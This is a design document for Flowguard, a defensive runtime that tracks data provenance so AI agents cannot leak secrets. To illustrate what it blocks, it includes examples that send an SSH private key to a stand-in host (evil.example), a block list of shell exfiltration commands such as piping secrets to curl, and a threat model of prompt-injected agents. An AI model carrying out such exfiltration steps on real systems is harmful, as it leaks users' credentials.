# Flowguard Vision and Design

## Executive Summary

Flowguard is a provenance-aware security runtime for AI agents.

Its unique angle is selective, agent-aware dynamic taint tracking at the runtime and tool boundary, backed by syscall-level process provenance as the fallback safety net.

Flowguard does not attempt universal instruction-level taint tracking in the MVP. It tracks high-value data objects and boundaries where agents actually move information: files, environment variables, prompts, tool inputs, model outputs, HTTP requests, sockets, subprocesses, and generated code execution.

This keeps overhead aligned with agent workloads, which are typically I/O-bound and model-call-bound rather than CPU-bound.

Its goal is to answer and enforce one security question:

> Did sensitive or untrusted data flow into an unsafe action?

Flowguard is not another general-purpose agent framework. Existing systems such as the OpenAI Agents SDK, LangGraph, AutoGen, CrewAI, LlamaIndex, Semantic Kernel, Google ADK, and Vercel AI SDK already provide orchestration, tool calling, memory, tracing, and deployment workflows.

Flowguard provides the missing security layer:

- selective low-overhead dynamic taint tracking
- provenance-aware data values
- guarded IO and tool boundaries
- policy enforcement before real-world effects
- explainable provenance graphs
- syscall-level fallback for unsupported or escaping code

The long-term product direction is:

> Data-loss prevention and provenance enforcement for AI agents.

## Problem

AI agents are not just chatbots. They execute actions that:

- read local files and credentials
- call APIs
- browse websites
- execute generated code
- run shell commands
- call MCP servers and external tools
- write files and deploy changes
- send data to network endpoints

The core risk is that agents mix instructions, data, tool output, generated code, and real-world effects inside one execution loop. This creates failure modes that traditional application security and prompt-only guardrails do not handle well.

Example:

```text
agent reads ~/.ssh/id_rsa
agent discards it or transforms it
agent later sends data over HTTP
```

At syscall/process granularity this becomes:

```text
secret file -> process -> network
```

That is conservative and useful for blocking obvious leaks, but it is prone to false positives because the whole process becomes tainted.

Flowguard includes a dynamic analysis layer that tracks data provenance inside the trusted agent runtime.

## Value Proposition

Flowguard gives developers and security teams:

- deterministic runtime enforcement instead of prompt-only best effort
- auditable explanations for blocked or allowed actions
- lower false positives than process-level provenance alone
- integration with existing agent frameworks
- a fallback safety net for subprocesses and unsupported execution paths
- a policy model centered on data movement, not just suspicious text

The key product claim is:

> Flowguard shows why an agent action was blocked or allowed by reconstructing the provenance of the data involved.

Example blocked explanation:

```text
file:/home/user/.ssh/id_rsa
  --read-->
python agent tool
  --payload construction-->
HTTP POST body
  --send-->
https://evil.example/upload
```

Example allowed explanation:

```text
file:/home/user/.ssh/id_rsa
  --read-->
python agent tool

constant telemetry string
  --send-->
https://telemetry.example/event

No secret-derived value reached the HTTP payload.
```

## Product Positioning

Flowguard does not compete primarily as:

- a model guardrail
- a prompt-injection classifier
- a generic observability dashboard
- a replacement for LangChain or OpenAI Agents SDK
- a pure syscall monitor

Flowguard competes as:

- a provenance runtime for AI agents
- an agent data-loss prevention layer
- an enforcement layer for tool calls, generated code, and egress
- an explainability layer for agent security decisions

## Core Security Principle

The core design rule is:

> No untracked egress.

If data leaves the trusted runtime through a path Flowguard inspects, Flowguard makes a precise decision.

If data attempts to leave through an unsupported path, Flowguard:

- blocks it,
- brokers it,
- requires explicit approval,
- or falls back to conservative syscall-level enforcement.

This is the correctness contract. Flowguard never silently allows an untracked path while claiming precise provenance.

## Architecture Overview

Flowguard is layered.

```text
Existing agent framework
  -> Flowguard adapter
  -> Flowguard trusted runtime
  -> provenance-aware IO/tools/code execution
  -> policy engine
  -> provenance report
  -> Rust syscall protect fallback
```

### Layer 1: Syscall-Level Process Provenance

The syscall-level process provenance layer owns the durable security model and broad fallback visibility:

- event schema
- provenance graph
- label propagation
- policy decisions
- explanation reconstruction
- report/log format
- CLI replay and regression scenarios
- syscall-level observation/protection fallback

This layer is implemented in Rust.

It provides broad coverage when:

- generated code escapes Python wrappers
- subprocesses run external binaries
- native extensions or unsupported libraries execute
- shell commands are approved but still need monitoring
- Flowguard cannot track object-level taint precisely

This layer is conservative:

```text
file -> process -> endpoint
```

It produces false positives in ambiguous cases, but it remains valuable as a safety net.

This is where the current Flowguard implementation already has useful foundations.

Current capabilities include:

- scenario replay
- process/file/pipe/socket/endpoint graph
- `SecretToNetwork` detection
- `ExternalToExec` style policies
- ptrace protect proof of concept
- `FdSnapshot` support
- explicit declassification boundary support

### Layer 2: Python Dynamic Taint Runtime

The first high-precision runtime is Python.

Reasons:

- most agent frameworks and examples are Python-first
- agent teams already use Python for tools, RAG, SDKs, and notebooks

The Python runtime provides dynamic provenance analysis for agent execution:

- `TrackedStr` and `TrackedBytes`
- provenance-aware containers where needed
- dynamic taint propagation through common string and byte operations
- guarded file reads
- guarded environment variable reads
- guarded HTTP clients
- guarded socket/network APIs, initially limited
- guarded tool input and output wrappers
- explicit declassification API
- generated-code executor
- subprocess broker
- JSONL event emission into the Rust core

Example developer API:

```python
from flowguard import guarded_open, guarded_post, declassify

secret = guarded_open("/home/user/.ssh/id_rsa").read()

guarded_post("https://evil.example/upload", data=secret)
# blocked

safe = declassify("ok", reason="constant telemetry")
guarded_post("https://telemetry.example/event", data=safe)
# allowed
```

### Layer 3: Framework Adapters

Flowguard integrates with existing agent frameworks by wrapping tools and execution boundaries.

Initial adapter targets:

1. OpenAI Agents SDK
2. LangGraph / LangChain
3. AutoGen
4. CrewAI
5. LlamaIndex

Adapters do not define Flowguard's security semantics. They map framework concepts into Flowguard runtime events:

- tool call start/end
- tool input/output provenance
- model-generated code execution
- human approval
- declassification
- network egress
- file and secret access

Adapter wrappers expose normal framework tools while binding tool inputs, outputs, and side effects to Flowguard provenance.

Example:

```python
from flowguard import flowguard_tool, guarded_open, guarded_post

@flowguard_tool(name="read_customer_file")
def read_customer_file(path: str):
    return guarded_open(path).read()

@flowguard_tool(name="send_report")
def send_report(url: str, report):
    return guarded_post(url, data=report)
```

The agent framework receives these as ordinary tools:

```python
agent = Agent(
    name="support-agent",
    instructions="Help with customer support tasks.",
    tools=[
        read_customer_file.as_openai_tool(),
        send_report.as_openai_tool(),
    ],
)
```

At runtime:

```text
model calls read_customer_file("/home/user/.ssh/id_rsa")
  -> Flowguard emits tool_start
  -> guarded_open creates Secret-tainted TrackedBytes
  -> Flowguard emits tool_end with Secret provenance

model calls send_report("https://evil.example/upload", report)
  -> Flowguard checks report provenance before HTTP egress
  -> Secret-derived payload is blocked
  -> report contains tool call path and blocked sink
```

### Layer 4: Subprocess Broker

Agents often execute shell commands.

For MVP, Flowguard does not instrument Bash. Shell is too broad and delegates work to many binaries such as `cat`, `curl`, `python`, `sed`, `git`, `ssh`, and package managers.

Instead:

- direct shell is blocked by default
- typed and brokered commands are allowed
- risky commands require approval
- unsupported subprocesses run under Rust syscall-level protection

Examples:

```text
allowed:
  git diff
  grep pattern public_file
  python formatter.py

blocked or approval-required:
  bash -c ...
  cat secret | curl ...
  scp ...
  curl --data @secret ...
  arbitrary package install scripts
```

## Model-Generated Code

If the model only calls predefined tools, Flowguard instruments tool boundaries.

If the model generates code and the runtime executes it, that generated code runs inside Flowguard's trusted executor. The executor dynamically instruments the generated Python code by controlling the execution environment around it. Flowguard does not instrument the model; it instruments the code path that runs the model output.

For Python MVP:

```text
model-generated Python code
  -> Flowguard Python executor
  -> dynamically instrumented execution environment
  -> guarded builtins/imports/libs
  -> TrackedStr / TrackedBytes
  -> dynamic taint propagation
  -> egress checks
```

The executor:

- replaces or mediates `open`
- wraps `requests`, `httpx`, and `urllib`
- converts secret-derived reads into tracked values
- propagates taint through supported Python operations
- blocks raw sockets initially
- blocks or brokers subprocess APIs
- blocks `ctypes`, arbitrary native extensions, and raw syscalls initially
- restricts imports to an allowlist
- emits provenance events for reads, transformations, and egress attempts
- emits precision-loss events when known conversions drop tracked provenance

Unsupported code paths are not silently allowed.

## Dynamic Analysis

Flowguard treats Python agent execution as a dynamic analysis target.

The Python runtime performs object-level taint tracking while the agent runs:

```text
secret source
  -> tracked Python value
  -> derived string/bytes/container
  -> HTTP payload, tool output, or subprocess input
  -> policy decision
```

The runtime tracks real execution, not static source-code intent. This matters because agents assemble actions dynamically from prompts, tool results, retrieved documents, generated code, and external content.

Dynamic taint analysis gives Flowguard a higher-precision signal than syscall/process provenance:

```text
syscall provenance:
  secret file -> process -> network
  result: possible leak

Python dynamic taint:
  secret file -> specific Python value -> specific HTTP payload
  result: definite leak
```

When the Python runtime proves that a payload contains no secret-derived tracked value, Flowguard allows cases that the process-level layer treats as ambiguous.

When execution escapes the Python taint runtime, Flowguard blocks, brokers, or falls back to syscall-level conservative analysis.

## Provenance and Taint Model

Flowguard uses several precision levels.

### Object-Level Dynamic Taint

MVP precision layer.

Flowguard tracks taint/provenance on Python values:

- `TrackedStr`
- `TrackedBytes`
- selected containers
- tool results
- HTTP payloads

Operations on tracked values propagate provenance.

Example:

```python
secret = guarded_open("/home/user/.ssh/id_rsa").read()
payload = "key=" + secret
guarded_post(url, data=payload)
```

The payload is secret-derived and is blocked.

Initial propagation coverage includes:

- string and bytes concatenation
- formatting and interpolation
- encode/decode boundaries
- selected slicing and joining operations
- selected list, tuple, and dictionary containers
- tool return values
- HTTP request bodies

### Precision-Loss Reporting

Some Python operations convert tracked values into plain runtime values.

Flowguard treats this as a precision gap, not proof of safety.

For generated Python code, the trusted executor wraps selected lossy boundaries such as:

- `json.dumps`
- `str`
- `bytes`

If tainted input enters one of these boundaries and the result no longer carries provenance, Flowguard emits `taint_precision_lost`.

In warning mode, the report shows the precision gap.

In strict mode, later supported network egress in the same protected scope is blocked as `TaintPrecisionLostToNetwork`.

This preserves the core correctness contract:

```text
unsupported or lossy provenance path
  -> explicit warning or block
  -> never silent allow while claiming precision
```

### Boundary Taint Sources and Sinks

Flowguard wraps important APIs:

- file read
- environment read
- HTTP send
- socket send
- tool input/output
- subprocess spawn
- generated-code execution

Boundary instrumentation creates taint at sources and enforces policy at sinks.

Sources include:

- secret files
- secret environment variables
- credential stores
- untrusted network and tool inputs
- model-generated code inputs

Sinks include:

- HTTP request body
- socket send buffer
- tool output entering model context
- subprocess stdin and argv
- file writes to sensitive locations

This is less complete than instruction-level taint, but it is practical and valuable.

### Process Provenance

Existing syscall-level model.

Flowguard uses it for broad fallback and explanation when precision is unavailable.

### Future: Instruction or Memory Taint

Possible future directions:

- Rust MIR/LLVM instrumentation for high-assurance Rust agents
- dynamic binary instrumentation
- CPython interpreter modifications
- QEMU/PANDA-style taint for research cases

These are not MVP requirements.

## Runtime Choice

### Python First

Python is the correct first runtime for adoption.

It aligns with:

- OpenAI Agents SDK
- LangChain / LangGraph
- AutoGen
- CrewAI
- LlamaIndex
- most RAG and tool ecosystems

### Rust Core

Rust remains the correct language for:

- policy engine
- graph engine
- CLI
- syscall protection
- high-integrity reporting
- future compiled-code instrumentation

### Rust-Native Agent Runtime Later

A Rust-native Flowguard agent runtime provides stronger guarantees for users willing to build high-assurance agents.

It is a later product track, not the first adoption path.

## Threat Model

Flowguard assumes:

- the model may be tricked by prompt injection
- external content may contain malicious instructions
- tool outputs may be attacker-controlled
- generated code may be malicious or careless
- subprocesses may attempt to exfiltrate data
- agents may have access to secrets, credentials, local files, and APIs

Flowguard protects against:

- secret data exfiltration
- untrusted data execution
- unsafe shell or interpreter launch
- sandbox escape primitives
- unapproved network egress
- provenance bypass attempts through unsupported APIs

Flowguard does not assume:

- the model is trustworthy
- prompt filtering is sufficient
- all code is statically known
- all third-party libraries are safe

## Enforcement Points

Initial enforcement points:

- secret file read
- environment secret read
- tool result entering model context
- generated code execution
- HTTP request body send
- socket send
- subprocess spawn
- shell command execution
- declassification approval

Every enforcement decision produces:

- event
- policy decision
- provenance explanation
- runtime action: allow, block, require approval, or fallback

## Declassification

Declassification is an explicit trust boundary.

It means:

```text
existing secret provenance is approved to stop propagating past this point
```

It does not prove byte independence.

Rules:

- declassification is explicit
- it is scoped by process/tool/action/sink where possible
- it is visible in the report
- future secret reads re-taint the data or process
- over-broad declassification is a policy risk

The Python runtime supports a stronger form:

```python
safe = declassify(value, reason="constant telemetry")
```

Only the returned value is declassified, not the entire process, when object-level provenance is available.

## MVP Definition

The next MVP demonstrates Flowguard as a Python dynamic taint runtime for agents, not only a syscall monitor.

Required demo cases:

1. Python agent reads secret and sends it over HTTP.
   - Result: blocked.
   - Explanation includes secret source and HTTP sink.

2. Python agent reads secret, discards it, sends constant telemetry.
   - Result: allowed under object-level provenance.
   - Explanation says no secret-derived data reached payload.

3. Python agent tries `subprocess("cat secret | curl ...")`.
   - Result: blocked or approval-required.
   - If approved, run under syscall fallback.

4. Agent framework adapter invokes Flowguard-wrapped tool.
   - Result: same provenance report as native runtime.

5. Unsupported raw socket or native escape attempt.
   - Result: blocked or handled by conservative fallback.

## Phased Roadmap

### Phase 1: Product and Runtime Contract

- finalized design
- trusted runtime API
- event schema for object-level dynamic taint
- JSONL bridge from Python runtime to Rust core
- policy semantics for precise vs conservative evidence

### Phase 2: Python Runtime MVP

- `TrackedStr` / `TrackedBytes`
- object-level dynamic taint propagation
- guarded file reads
- guarded HTTP send
- simple transformation propagation
- explicit value-level declassification
- subprocess block/broker
- report generation through Rust core

### Phase 3: Agent Adapter MVP

- starts after the Python runtime skeleton exposes stable source, sink, propagation, declassification, event, and report interfaces
- one framework adapter validates the runtime contract before broad adapter coverage
- OpenAI Agents SDK adapter
- simple LangGraph adapter after the first adapter proves the contract
- tool wrapper decorators
- model-generated Python executor

### Phase 4: Runtime Protection Integration

- Rust `protect` integration around generated code and subprocesses
- policy fusion between object-level provenance and syscall provenance
- improved warning quality and endpoint precision

### Phase 5: Enterprise Product Surface

- policy packs
- SIEM / OpenTelemetry export
- dashboards
- approval workflows
- audit trails
- MCP gateway integration
- organization-level secret/source/sink inventory

### Phase 6: High-Assurance Runtime Track

- Rust MIR/LLVM instrumentation
- compiled-agent SDK
- optional DBI experiments
- stronger guarantees for regulated environments

## Correctness Claims

Flowguard makes precise claims only inside its trusted runtime.

Precise claim:

```text
No secret-derived tracked value reached this HTTP payload.
```

Allowed only when:

- all relevant data entered through Flowguard-guarded APIs
- transformations preserved tracked provenance
- egress occurred through Flowguard-guarded APIs
- unsupported escapes were blocked or brokered

Conservative claim:

```text
This process read a secret and later sent network data.
```

Used when:

- code executed outside trusted runtime
- subprocesses ran external binaries
- native/unsupported libraries were used
- object provenance was unavailable

This distinction is visible in reports.

## Open Questions

- How do policies express confidence: possible vs definite leaks?
- How narrow are declassification scopes in the first Python runtime?
- Which HTTP and socket libraries are supported first?
- What import restrictions are acceptable for generated code?
- How does Flowguard integrate with MCP servers?
- What is the minimum useful OpenAI Agents SDK adapter?
- How do reports represent model context without storing sensitive prompts?
- Does the Rust core remain the only policy engine, or does Python enforce some policies locally for latency?

## Related Ecosystem

Useful external systems and concepts:

- OpenAI Agents SDK: agents, tools, guardrails, tracing, sessions, sandbox agents.
  <https://openai.github.io/openai-agents-python/>
- LangGraph / LangChain: orchestration runtime and agent framework.
  <https://docs.langchain.com/oss/python/langgraph/overview>
- AutoGen: multi-agent framework with code execution support.
  <https://microsoft.github.io/autogen/stable/>
- CrewAI: agents, crews, flows, guardrails, memory, and observability.
  <https://docs.crewai.com/>
- LlamaIndex: data/RAG-focused agent framework.
  <https://developers.llamaindex.ai/python/framework/understanding/agent/>
- Semantic Kernel: multi-language agent/function-calling middleware.
  <https://learn.microsoft.com/en-us/semantic-kernel/overview/>
- Gemini managed agents: sandboxed managed agents and agent framework ecosystem references.
  <https://ai.google.dev/gemini-api/docs/agents>

Flowguard's opportunity is not to replace these systems. It is to provide provenance-aware security for the actions they execute.
